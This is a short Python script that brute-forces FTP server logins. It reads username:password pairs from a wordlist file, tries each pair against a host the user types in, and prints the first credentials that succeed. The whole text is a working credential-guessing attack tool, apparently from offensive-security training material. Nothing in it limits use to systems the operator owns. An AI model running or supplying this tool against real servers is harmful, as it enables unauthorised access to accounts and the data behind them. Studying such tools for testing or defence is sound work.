#!/usr/bin/python3

import ftplib

def bruteLogin(host,passwdFile):
	try:
		pF = open(passwdFile,'r')
	except:
		print("[!!] file Does'nt Exist!!!")
	for line  in pF.readlines():
		username = line.split(':')[0]
		password = line.split(':')[1].strip('\n')
		print("[+] Trying " +username+ " / " +password)
		try:
			ftp = ftplib.FTP(host)
			login = ftp.login(username,password)
			print("[+] Login Succeeded With Username: " +username+ " and Password: " +password)
			ftp.quit()
			return(username,password)
		except:
			pass
	print("[-] Username/Password not in list")
			
host = input("[*] Enter IP Address: ")
passwdFile = input("[*] Enter User/Password File: ")
bruteLogin(host,passwdFile)
